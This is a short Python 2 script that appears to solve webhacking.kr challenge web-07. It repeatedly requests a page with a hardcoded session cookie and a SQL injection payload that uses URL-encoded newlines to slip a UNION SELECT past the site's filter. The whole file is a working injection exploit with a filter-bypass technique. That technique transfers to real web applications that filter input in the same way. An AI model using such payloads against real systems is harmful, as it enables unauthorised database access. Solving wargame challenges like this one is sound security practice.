import requests

cookies = {"PHPSESSID": "9da0cd172fbd9b622bdb335285922028"}
url = "http://webhacking.kr/challenge/web/web-07/index.php?val="
# try for rand = 1
payload = "0)%0aunion%0aselect%0a(3-1"

while True :
    r = requests.get(url+payload, cookies=cookies)
    if "Access Denied!" in r.text :
        print "Access Denied!"
        break
    if "nice try" in r.text :
        print "nice try!"
        continue
    else :
        print r.text
        break
